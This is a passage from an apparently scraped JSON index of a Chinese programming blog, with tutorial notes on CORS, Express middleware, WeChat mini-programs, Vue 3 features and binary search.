请求类型简单请求满足两个条件即为简单请求： 1 请求方式为GET,POST,HEAD三者之一 2 HTTP头部信息不超过以下几种字段：无定义头部字段，Accept,Accept-Language,Content-Language,Save-Data,Viewport-Width,Width,Content-Type(仅限于text-plain,multipart/form-data,application/x-www-form-urlencoded三者之一) 特点：客户端与服务器只发生一次请求 预检请求1 请求方式为GET,POST,HEAD之外的请求方法 2 请求头中包含自定义头部字段 3 向服务器发送了application/jso格式的数据 在浏览器服务器的正式通信之前，浏览器会先发送OPTION请求进行预检，以获知该服务器是否允许该实际请求，这一次OPTION称为预检请求，服务器成功响应预检请求后才会发送真正的请求并且携带真正的数据。 特点：客户端与服务器只发生两次请求 CORS注意事项1 CORS主要在服务器端进行配置，客户端浏览器无需做任何额外的配置，即可请求开启CORS的接口 2 CORS在浏览器中有兼容性，只有支持XMLHttpRequest Level2的浏览器才能正常访问开启了CORS的服务端接口（IE10+,Chrome4+等）","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"自定义表单中间件","slug":"自定义表单中间件","date":"2022-03-13T15:13:46.000Z","updated":"2022-03-13T15:32:36.539Z","comments":true,"path":"2022/03/13/自定义表单中间件/","link":"","permalink":"https://coloey.github.io/2022/03/13/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%95%E4%B8%AD%E9%97%B4%E4%BB%B6/","excerpt":"","text":"12345678910111213const express=require(&#x27;express&#x27;)//创建web服务器实例const app=express()//导入处理查询字符串的querystring,通过这个模块提供的parse()函数，可以查询字符串，解析成对象的格式//const qs=require(&#x27;querystring&#x27;)const customBodyParser=require(&#x27;./custom-body-parser&#x27;)app.use(customBodyParser)app.post(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(req.body)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;express server running at http://127.0.0.1&#x27;)&#125;) customBodyParser.js 1234567891011121314151617const qs=require(&#x27;querystring&#x27;)const bodyParser=(req,res,next)=&gt;&#123; //1 定义一个str字符串，专门用来存储客户端发送过来的请求体数据 let str=&quot;&quot; //监听req的data事件 req.on(&#x27;data&#x27;,(chunk)=&gt;&#123; str+=chunk &#125;) //监听req的end事件 req.on(&#x27;end&#x27;,()=&gt;&#123; //在str存放的是完整的请求体数据，解析成对象格式 调用qs.parse()方法，把查询字符串解析为对象 const body=qs.parse(str) req.body=body//将解析处的请求体数据挂载为req.body next() &#125;)&#125;module.exports=bodyParser","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"路由","slug":"路由","date":"2022-03-12T15:34:29.000Z","updated":"2022-03-12T15:34:30.216Z","comments":true,"path":"2022/03/12/路由/","link":"","permalink":"https://coloey.github.io/2022/03/12/%E8%B7%AF%E7%94%B1/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"中间件","slug":"中间件","date":"2022-03-12T07:57:20.000Z","updated":"2022-03-13T15:29:55.148Z","comments":true,"path":"2022/03/12/中间件/","link":"","permalink":"https://coloey.github.io/2022/03/12/%E4%B8%AD%E9%97%B4%E4%BB%B6/","excerpt":"","text":"使用express创建服务器，发起Get,Post请求123456789101112131415161718192021222324252627const express=require(&#x27;express&#x27;)//创建web服务器实例const app=express()//监听客户端的get请求post请求,并向客户端响应请求app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(&#123;name:&#x27;zs&#x27;,age:20,gender:&#x27;男&#x27;&#125;)&#125;)app.post(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(&#x27;请求成功&#x27;)&#125;)//获取请求参数app.get(&quot;/&quot;,(req,res)=&gt;&#123; //req.query可以获取到客户端发送过来的查询参数向客户端响应一个查询参数 console.log(req.query) res.send(req.query)&#125;)//获取到URL中的动态参数app.get(&quot;/user/:id/:username&quot;,(req,res)=&gt;&#123; console.log(req.params) res.send(req.params)&#125;)//启动服务器app.listen(80,()=&gt;&#123; console.log(&#x27;express server running at http://127.0.0.1&#x27;)&#125;) 托管静态资源express.static()：创建一个静态资源服务器，通过如下代码可以将public目录下的图片，CSS文件，JavaScript文件对外开放访问 123456789101112const express=require(&#x27;express&#x27;)//创建web服务器实例const app=express()//托管多个静态资源目录,express.static会根据目录的添加顺序查找所需文件，http://127.0.0.1,public不出现在路径中app.use(express.static(&#x27;public&#x27;))app.use(express.static(&#x27;files&#x27;))//希望挂载前缀ap.use(&#x27;/public&#x27;,express.static(&#x27;public&#x27;,))//打开的是http://127.0.0.1/public，如果希望public出现在路径中则将访问前缀写public//启动服务器app.listen(80,()=&gt;&#123; console.log(&#x27;express server running at http://127.0.0.1&#x27;)&#125;) 中间件中间件的作用：多个中间件之间共享一份req和res,基于这种特性可以在上游的中间件中，统一为req或res对象添加自定义顶点属性或方法，供下游的中间件或路由进行使用 1234567891011121314151617const express=require(&quot;express&quot;)const app=express()//中间件的作用：共享req,resapp.use((req,res,next)=&gt;&#123; const time=Date.now() req.startTime=time next()&#125;)app.get(&#x27;/&#x27;,(req,res)=&gt;&#123; res.send(&#x27;Home page&#x27;+req.startTime)&#125;)app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(&#x27;User page&#x27;+req.startTime)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;http://127.0.0.1&#x27;)&#125;) 中间件分类：[]: http://expressjs.com/en/guide/using-middleware.html 错误级别的中间件要注册在所有路由之后 1234567891011121314const express = require(&quot;express&quot;);const app=express()app.get(&#x27;/&#x27;,(req,res)=&gt;&#123; throw new Error(&#x27;服务器发生错误&#x27;) res.send(&#x27;Home page&#x27;)&#125;)//错误级别中间件必须注册在所有路由之后app.use((err,req,res,next)=&gt;&#123; console.error(err.message) res.send(&#x27;Something broke:&#x27;+err.message)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;http://127.0.0.1&#x27;)&#125;) 使用中间件的注意事项 要在路由之前注册中间件 客户端发送过来的请求，可以连续调用多个中间件进行处理 执行完中间件的业务代码，要记得调用next（）函数 连续调用的多个中间件时，多个中间件间共享req和res对象","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"Web和微信小程序中本地存储的差别","slug":"Web和微信小程序中本地存储的差别","date":"2022-03-01T09:23:54.000Z","updated":"2022-03-01T09:32:35.988Z","comments":true,"path":"2022/03/01/Web和微信小程序中本地存储的差别/","link":"","permalink":"https://coloey.github.io/2022/03/01/Web%E5%92%8C%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B8%AD%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E7%9A%84%E5%B7%AE%E5%88%AB/","excerpt":"","text":"Web和微信小程序中本地存储的差别使用上Web:localStorage.setItem(“key”,”value”) ​ localStorage.getItem(“key”) 小程序中：wx.setStorageSync(“key”,”value”); ​ wx.getStorageSync(“key”) 数据存储Web:不管存入的是什么类型的数据，最终都会先调用toString()，把数据编程字符串再存进去 小程序：不存在类型转换，存什么类型的数据进去，获取的就是什么类型的数据","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"swiper","slug":"swiper","date":"2022-02-28T03:27:42.000Z","updated":"2022-02-28T03:31:48.073Z","comments":true,"path":"2022/02/28/swiper/","link":"","permalink":"https://coloey.github.io/2022/02/28/swiper/","excerpt":"","text":"swiper存在默认宽度和高度：100%*150px image存在默认宽度和高度：320px*240px 设计图片和轮播图： 1 先看原图的宽高：750*340 2 让图片的高度自适应 宽度等于100% 3 让swiper标签的高度变成和图片的一样高即可 4 图片标签mode=“widthFix”","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"组件通信","slug":"组件通信","date":"2022-02-26T15:39:09.000Z","updated":"2022-02-26T15:40:12.435Z","comments":true,"path":"2022/02/26/组件通信/","link":"","permalink":"https://coloey.github.io/2022/02/26/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/","excerpt":"","text":"父组件向子组件传递数据1 父组件中： 123&lt;view&gt; &lt;Tab tabs=&quot;&#123;&#123;tabs&#125;&#125;&quot; binditemChange=&quot;handleItemChange&quot;&gt;&lt;/Tab&gt;&lt;/view&gt; 2.子组件： 1234567properties: &#123; tabs:&#123; type:Array, value:[] &#125; &#125;, 子组件向父组件传递数据：1 子组件：用this.triggerEvent(“事件名”,传递的参数) 123456789methods:&#123; handle(e)&#123; const &#123;index&#125;=e.currentTarget.dataset; this.triggerEvent(&quot;itemChange&quot;,&#123;index&#125;); &#125; &#125; 2 父组件：用”bind+事件名”触发自定义方法 123&lt;view&gt; &lt;Tab tabs=&quot;&#123;&#123;tabs&#125;&#125;&quot; binditemChange=&quot;handleItemChange&quot;&gt;&lt;/Tab&gt;&lt;/view&gt; 12345678910handleItemChange(e)&#123; //console.log(e) const &#123;index&#125;=e.detail; let &#123;tabs&#125;=this.data; tabs.forEach((v,i)=&gt;i===index?v.isActive=true:v.isActive=false); this.setData(&#123; tabs &#125;) &#125;","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"事件绑定","slug":"事件绑定","date":"2022-02-25T09:06:50.000Z","updated":"2022-02-26T15:40:06.139Z","comments":true,"path":"2022/02/25/事件绑定/","link":"","permalink":"https://coloey.github.io/2022/02/25/%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A/","excerpt":"","text":"绑定输入事件 用bindinput 获取输入框的值用e.detail.value 输入框赋值用this.setData({num:e.detail.num}) 点击事件 关键字:bindtap 无法在小程序中的事件直接传参，通过自定义事件传参 事件源中获取自定义属性","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"路由参数","slug":"路由参数","date":"2022-02-06T08:51:25.000Z","updated":"2022-02-06T15:07:41.991Z","comments":true,"path":"2022/02/06/路由参数/","link":"","permalink":"https://coloey.github.io/2022/02/06/%E8%B7%AF%E7%94%B1%E5%8F%82%E6%95%B0/","excerpt":"","text":"query参数：12345678&lt;li v-for=&#x27;m in messageList&#x27; :key=&#x27;m.id&#x27;&gt; &lt;!-- 通过query传递参数 --&gt; &lt;router-link :to=&quot; &#123; name:&#x27;messageDetail&#x27;, query:&#123;id:m.id,title:m.title&#125; &#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;&lt;/li&gt; params参数:1 配置路由声明接收param参数 1234567891011&#123;path:&#x27;/home&#x27;, component:Home, children:[ &#123;path:&#x27;news&#x27;, component:News&#125;, &#123;path:&#x27;message&#x27;, component:Message, children:[ &#123;path:&#x27;detail/:id/:title&#x27;,name:&#x27;messageDetail&#x27;,component:Detail&#125;//使用占位符声明接收params参数 ]&#125; ]&#125;, 2 传递参数 12345678910 &lt;li v-for=&#x27;m in messageList&#x27; :key=&#x27;m.id&#x27;&gt; &lt;!--跳转并携带params参数，to的字符写法--!&gt; &lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt; &lt;!-- 对象写法只能写name不能写path --&gt; &lt;!-- &lt;router-link :to=&quot; &#123;name:&#x27;messageDetail&#x27;, params:&#123;id:m.id,title:m.title&#125; &#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt; --&gt;&lt;/li&gt; 注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置项 props配置123456789101112//props第一种写法，值为对象，该对象中的key-value都会以props的形式传给Detail组件props:&#123;a:1,b:&#x27;hello&#x27;&#125;,//props的第二种写法，值为布尔值，若布尔值为真，就会把该路由组件收到的所有params参数以props的形式传给Detail组件props:true,//第三种写法，值为函数props($route)&#123; return &#123;id:$route.query.id,title:$route.query.title&#125;&#125;,//解构赋值props(&#123;query&#125;)&#123; return &#123;id:query.id,title:query.title&#125;&#125; Detail组件接收参数： 123456&lt;script&gt;export default &#123; name:&#x27;Detail&#x27;, props:[&#x27;id&#x27;,&#x27;title&#x27;],&#125;&lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Vue3事件总线","slug":"Vue3事件总线","date":"2022-02-02T08:17:38.000Z","updated":"2022-02-02T08:38:36.586Z","comments":true,"path":"2022/02/02/Vue3事件总线/","link":"","permalink":"https://coloey.github.io/2022/02/02/Vue3%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF/","excerpt":"","text":"全局事件总线一种组件间的通信方式，适用于任意组件间的通信。 安装全局事件总线： 引入/编写事件库 在入口文件中挂载 在组件中引入并使用 安装：npm install –save vue3-eventbus 挂载： 123//App.vueimport eventBus from &#x27;vue3-eventbus&#x27;app.use(eventBus) 使用： 12345678//Button.vueimport bus from &#x27;vue3-eventbus&#x27;export default &#123; setup()&#123; bus.emit(&#x27;foo&#x27;,&#123;a:&#x27;b&#x27;&#125;) &#125;&#125; 消息订阅预发布（pubsub) 安装pubsub:npm install pubsub-js 引入：import pubsub from “pubsub-js” 接收数据，A组件想接收数据，则在A组件中订阅消息，订阅回调留在A组件自身。 12345678910methods()&#123; demo(data)&#123; &#125;&#125;mounted()&#123;this.pid=pubsub.subscribe(&#x27;xxx&#x27;,(msg,data)=&gt;&#123;&#125;)//订阅消息&#125; 提供数据：pubsub.publish(‘xxx’,数据) 最好在beforeDestroy钩子中，用Pubsub.unsubscribe(pid)取消订阅","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"customRef","slug":"customRef","date":"2022-02-01T08:55:59.000Z","updated":"2022-02-01T09:03:45.036Z","comments":true,"path":"2022/02/01/customRef/","link":"","permalink":"https://coloey.github.io/2022/02/01/customRef/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031setup()&#123; function myRef(value,delay=500)&#123; let timeout return customRef((track,trigger)=&gt;&#123; return &#123; get()&#123; console.log(`有人从myRef中读取了数据:$&#123;value&#125;`) track()//通知Vue追踪value的变化（提前和get商量一下，让它认为这个value是可用的） return value &#125;, set(newValue)&#123; clearTimeout(timeout) console.log(`有人从myRef中修改了数据:$&#123;newValue&#125;`) timeout=setTimeout(()=&gt;&#123; value=newValue trigger()//通知Vue重新解析模板 &#125;,delay) &#125; &#125; &#125;) &#125; let val=myRef(&quot;hello&quot;) return &#123; val &#125; &#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"shallowReactive和shallowRef","slug":"shallowReactive和shallowRef","date":"2022-01-31T08:41:52.000Z","updated":"2022-02-01T07:57:53.734Z","comments":true,"path":"2022/01/31/shallowReactive和shallowRef/","link":"","permalink":"https://coloey.github.io/2022/01/31/shallowReactive%E5%92%8CshallowRef/","excerpt":"","text":"shallowReactive:只处理对象最外层属性的响应式（浅响应式） shallowRef:只处理基本数据类型的响应式，不进行对象的响应式处理 什么时候使用？ 如果有一个对象数据，结构比较深，但变化时只是外层属性变化==&gt;shallowReactive 如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换==&gt;shallowRef","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"toRef","slug":"toRef","date":"2022-01-31T07:49:20.000Z","updated":"2022-05-04T03:47:58.739Z","comments":true,"path":"2022/01/31/toRef/","link":"","permalink":"https://coloey.github.io/2022/01/31/toRef/","excerpt":"","text":"toRef:作用：创建一个ref对象，其value值指向另一个对象中的某个属性，可以用来为源响应式对象上的某个 property 新创建一个 ref。然后，ref 可以被传递，它会保持对其源 property 的响应式连接。 语法：const name=toRef(person,’name’) 应用：要将响应式对象中的某个属性单独提供给外部使用时 扩展:toRefs与toRef功能一致，但可以批量创建多个ref对象，语法：toRefs(person),将响应式对象转换为普通对象，其中结果对象的每个 property 都是指向原始对象相应 property 的 ref。 123456789101112const state = reactive(&#123; foo: 1, bar: 2&#125;)const fooRef = toRef(state, &#x27;foo&#x27;)fooRef.value++console.log(state.foo) // 2state.foo++console.log(fooRef.value) // 3 当你要将 prop 的 ref 传递给复合函数时，toRef 很有用： 12345export default &#123; setup(props) &#123; useSomeFeature(toRef(props, &#x27;foo&#x27;)) &#125;&#125; 即使源 property 不存在，toRef 也会返回一个可用的 ref。这使得它在使用可选 prop 时特别有用，可选 prop 并不会被 toRefs 处理。 toRefs将响应式对象转换为普通对象，其中结果对象的每个 property 都是指向原始对象相应 property 的 ref。 123456789101112131415161718192021const state = reactive(&#123; foo: 1, bar: 2&#125;)const stateAsRefs = toRefs(state)/*stateAsRefs 的类型:&#123; foo: Ref&lt;number&gt;, bar: Ref&lt;number&gt;&#125;*/// ref 和原始 property 已经“链接”起来了state.foo++console.log(stateAsRefs.foo.value) // 2stateAsRefs.foo.value++console.log(state.foo) // 3 当从组合式函数返回响应式对象时，toRefs 非常有用，这样消费组件就可以在不丢失响应性的情况下对返回的对象进行解构/展开： 1234567891011121314151617181920212223function useFeatureX() &#123; const state = reactive(&#123; foo: 1, bar: 2 &#125;) // 操作 state 的逻辑 // 返回时转换为ref return toRefs(state)&#125;export default &#123; setup() &#123; // 可以在不失去响应性的情况下解构 const &#123; foo, bar &#125; = useFeatureX() return &#123; foo, bar &#125; &#125;&#125; toRefs 只会为源对象中包含的 property 生成 ref。如果要为特定的 property 创建 ref，则应当使用 toRef","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"watchEffect","slug":"watchEffect","date":"2022-01-30T15:44:30.000Z","updated":"2022-01-30T15:51:06.817Z","comments":true,"path":"2022/01/30/watchEffect/","link":"","permalink":"https://coloey.github.io/2022/01/30/watchEffect/","excerpt":"","text":"watch和watchEffect区别：watch:既要指明监视的属性，也要指明监视的回调 watchEffect:不用指明监视哪个属性，监视的回调中用到哪个属性就监视哪个属性 watchEffect有点像computed: 但computed注重的是计算出来的值即回调函数的返回值，所以必须要写返回值 而watch注重的是过程即回调函数的函数体，所以不用写返回值 123456789//watchEffect指定的回调函数中用到的数据只要发生变化，则直接重新执行回调 let sum=ref(1) let msg=ref(&quot;你好呀&quot;) watchEffect(()=&gt;&#123; const x1=sum.value const x2=person.firstName console.log(&#x27;watchEffect的回调被调用了&#x27;,x1,x2) &#125;)","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"二分查找","slug":"二分查找","date":"2022-01-30T07:37:59.000Z","updated":"2022-01-30T07:53:02.198Z","comments":true,"path":"2022/01/30/二分查找/","link":"","permalink":"https://coloey.github.io/2022/01/30/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/","excerpt":"","text":"大家写二分法经常写乱，主要是因为对区间的定义没有想清楚，区间的定义就是不变量。要在二分查找的过程中，保持不变量，就是在while寻找中每一次边界的处理都要坚持根据区间的定义来操作，这就是循环不变量规则。 写二分法，区间的定义一般为两种，左闭右闭即[left, right]，或者左闭右开即[left, right)。 下面我用这两种区间的定义分别讲解两种不同的二分写法。 二分法第一种写法第一种写法，我们定义 target 是在一个在左闭右闭的区间里，也就是[left, right] （这个很重要非常重要）。 区间的定义这就决定了二分法的代码应该如何写，因为定义target在[left, right]区间，所以有如下两点： while (left &lt;= right) 要使用 &lt;= ，因为left == right是有意义的，所以使用 &lt;= if (nums[middle] &gt; target) right 要赋值为 middle - 1，因为当前这个nums[middle]一定不是target，那么接下来要查找的左区间结束下标位置就是 middle - 1 1234567891011121314151617181920// 版本一class Solution &#123;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int left = 0; int right = nums.size() - 1; // 定义target在左闭右闭的区间里，[left, right] while (left &lt;= right) &#123; // 当left==right，区间[left, right]依然有效，所以用 &lt;= int middle = left + ((right - left) / 2);// 防止溢出 等同于(left + right)/2 if (nums[middle] &gt; target) &#123; right = middle - 1; // target 在左区间，所以[left, middle - 1] &#125; else if (nums[middle] &lt; target) &#123; left = middle + 1; // target 在右区间，所以[middle + 1, right] &#125; else &#123; // nums[middle] == target return middle; // 数组中找到目标值，直接返回下标 &#125; &#125; // 未找到目标值 return -1; &#125;&#125;; 二分法第二种写法如果说定义 target 是在一个在左闭右开的区间里，也就是[left, right) ，那么二分法的边界处理方式则截然不同。 有如下两点： while (left &lt; right)，这里使用 &lt; ,因为left == right在区间[left, right)是没有意义的 if (nums[middle] &gt; target) right 更新为 middle，因为当前nums[middle]不等于target，去左区间继续寻找，而寻找区间是左闭右开区间，所以right更新为middle，即：下一个查询区间不会去比较nums[middle] 1234567891011121314151617181920// 版本二class Solution &#123;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int left = 0; int right = nums.size(); // 定义target在左闭右开的区间里，即：[left, right) while (left &lt; right) &#123; // 因为left == right的时候，在[left, right)是无效的空间，所以使用 &lt; int middle = left + ((right - left) &gt;&gt; 1); if (nums[middle] &gt; target) &#123; right = middle; // target 在左区间，在[left, middle)中 &#125; else if (nums[middle] &lt; target) &#123; left = middle + 1; // target 在右区间，在[middle + 1, right)中 &#125; else &#123; // nums[middle] == target return middle; // 数组中找到目标值，直接返回下标 &#125; &#125; // 未找到目标值 return -1; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"插槽","slug":"插槽","date":"2022-01-29T15:41:20.000Z","updated":"2022-01-29T15:58:25.041Z","comments":true,"path":"2022/01/29/插槽/","link":"","permalink":"https://coloey.github.io/2022/01/29/%E6%8F%92%E6%A7%BD/","excerpt":"","text":"1 作用： 让父组件可以向子组件指定位置插入html结构，是一种组件间的通信方式，适用于父组件=&gt;子组件 2 使用方式 （1）默认插槽 123456789101112父组件： &lt;Category&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/Category&gt;子组件： &lt;template&gt; &lt;div&gt; &lt;slot&gt;插槽默认内容&lt;/slot&gt; &lt;/div&gt; &lt;/template&gt; 2 具名插槽 1234567891011121314151617181920212223242526父组件： &lt;Category&gt; &lt;template #header&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/template&gt; &lt;template slot=&quot;center&quot;&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/template&gt; &lt;template v-slot:footer&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/template&gt; &lt;/Category&gt;子组件： &lt;template&gt; &lt;div&gt; &lt;slot name=&quot;center&quot;&gt;插槽默认内容&lt;/slot&gt; &lt;slot name=&quot;footer&quot;&gt;插槽默认内容&lt;/slot&gt; &lt;/div&gt; &lt;/template&gt; 3 作用域插槽 理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者决定，(games数据在Category组件中，但使用数据所遍历的结构由App组件决定) 12345678910111213141516171819202122232425262728293031323334353637383940414243父组件：&lt;Category title=&quot;游戏&quot;&gt; &lt;template v-slot=&quot;&#123;games&#125;&quot;&gt; &lt;ul&gt; &lt;li v-for=&quot;(game,index) in games&quot; :key=&quot;index&quot;&gt; &#123;&#123;game&#125;&#125; &lt;/li&gt; &lt;/ul&gt; &lt;/template&gt;&lt;/Category&gt;&lt;Category title=&quot;游戏&quot;&gt; &lt;template v-slot=&quot;&#123;games&#125;&quot;&gt; &lt;ol&gt; &lt;li v-for=&quot;(game,index) in games&quot; :key=&quot;index&quot;&gt; &#123;&#123;game&#125;&#125; &lt;/li&gt; &lt;/ol&gt; &lt;/template&gt;&lt;/Category&gt;子组件：&lt;template&gt;&lt;div&gt; &lt;h3&gt;&#123;&#123;title&#125;&#125;分类&lt;/h3&gt; &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;&lt;/div&gt; &lt;/template&gt;&lt;script&gt;import &#123;reactive&#125; from &quot;vue&quot;export default &#123; name:&#x27;Category&#x27;, props:[&#x27;title&#x27;], setup()&#123; let games=reactive([&#x27;红色警戒&#x27;,&#x27;超级玛丽&#x27;,&#x27;穿越火线&#x27;,&#x27;魂斗罗&#x27;]) return&#123; games &#125; &#125;&#125;&lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"ref函数","slug":"ref函数","date":"2022-01-27T07:38:53.000Z","updated":"2022-02-01T09:52:15.436Z","comments":true,"path":"2022/01/27/ref函数/","link":"","permalink":"https://coloey.github.io/2022/01/27/ref%E5%87%BD%E6%95%B0/","excerpt":"","text":"ref函数：作用：定义一个响应式函数 语法：const xxx=ref(initValue) 创建一个包含响应式数据的引用对象（reference对象，简称ref对象) JS中操作数据：xxx.value 模板中读取数据，不需要.value,直接 Ps: 接收的数据类型可以是：基本类型也可以是对象类型 基本类型的数据：响应式依然是靠Object.defineProperty()的get与set完成 对象基本类型的数据：内部是求助了Vue3中的一个新函数——reactive函数 ref与reactive对比：定义数据角度：ref用来定义：基本类型数据 reactive用来定义：对象（或数组类型数据） PS：ref也可以用来定义对象（或数组）类型数据，它内部会自动通过reactive转为代理对象 从原理角度对比：ref通过Object.defineProperty()的getter和setter来实现响应式（数据劫持） reactive通过使用Proxy来实现响应式，并通过Reflect操作源对象内部的数据 使用角度对比：ref定义的数据，操作数据需要通过.value,读取数据时模板直接读取不需要.value reactive定义的数据操作数据与读取数据均不需要.value 响应式数据的判断isRef:检查一个值是否为一个ref对象 isReactive:检查一个对象是否由reactive创建的响应式代理 isReadonly:检查一个对象是否由readonly创建的只读代理 isProxy:检查一个对象是否由reactive或者readonly方法创建的代理","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"props","slug":"props","date":"2022-01-27T04:14:42.000Z","updated":"2022-01-27T05:34:36.203Z","comments":true,"path":"2022/01/27/props/","link":"","permalink":"https://coloey.github.io/2022/01/27/props/","excerpt":"","text":"配置项:props 功能：让组件接收外部传来的数据 （1）传递数据： 第一种方式（只接收）：props:[‘name’] 第二种方式（限制类型）：props:{name:String} 第三种方式（限制类型，限制必要性，指定默认值）： props:{ ​ name:{ ​ type:String,//类型 ​ required:true,//必要性 ​ dedault:’老王’//默认值 ​ } } Ps:props是只读的，vue底层会监视你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后修改data中的数 eg:data(){ return{ myName:this.myName } }","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"生命周期钩子","slug":"生命周期钩子","date":"2022-01-26T02:13:45.000Z","updated":"2022-05-15T08:41:28.907Z","comments":true,"path":"2022/01/26/生命周期钩子/","link":"","permalink":"https://coloey.github.io/2022/01/26/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90/","excerpt":"","text":"beforeCreate,created,beforeMount,mounted,beforeUpdate,updated,beforeUnmount,unmounted 常用生命周期钩子:mounted:发送ajax请求，启动定时器，绑定自定义事件，订阅消息等【初始化操作】 beforeUnmount:清除定时器，解绑自定义事件，取消订阅消息等【收尾工作】 关于销毁实例： 1 销毁后借助Vue开发者工具看不到任何信息 2 销毁后自定义事件失效，但原生DOM事件依然有效 3 一般不会在beforeUnmount操作数据，因为即使操作数据，也不会触发更新流程了","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"自定义指令","slug":"自定义指令","date":"2022-01-25T09:14:32.000Z","updated":"2022-01-25T09:39:59.802Z","comments":true,"path":"2022/01/25/自定义指令/","link":"","permalink":"https://coloey.github.io/2022/01/25/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/","excerpt":"","text":"自定义指令1.语法：（1） 局部指令：​ directives:{指令名：配置对象}或 directives：{指令名:回调函数} （2）全局指令：Vue.directive(指令名，配置对象)或Vue.directive(指令名，回调函数) 2.配置对象中常用的回调created：在绑定元素的 attribute 或事件监听器被应用之前调用。在指令需要附加在普通的 v-on 事件监听器调用前的事件监听器中时，这很有用。` beforeMount：当指令第一次绑定到元素并且在挂载父组件之前调用。mounted：指令与元素成功绑定时使用 updated:在包含组件的 VNode 及其子组件的 VNode 更新后调用。 beforeUpdate：在更新包含组件的 VNode 之前调用。 beforeUnmount：在卸载绑定元素的父组件之前调用 unmounted：当指令与元素解除绑定且父组件已卸载时，只调用一次。 PS:指令定义时不加v-,，但是使用时要加v- 指令名如果是多个单词要用kebab-case命名方式，不要用camelCase命名 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &lt;div id=&quot;root&quot;&gt; &lt;h3&gt;&#123;&#123;name&#125;&#125;&lt;/h3&gt; &lt;h3&gt;当前n:&lt;span v-text=&quot;n&quot;&gt;&#123;&#123;n&#125;&#125;&lt;/span&gt;&lt;/h3&gt; &lt;h3&gt;放大10倍后的n：&lt;span v-big=&quot;n&quot;&gt;&#123;&#123;n&#125;&#125;&lt;/span&gt;&lt;/h3&gt; &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt; 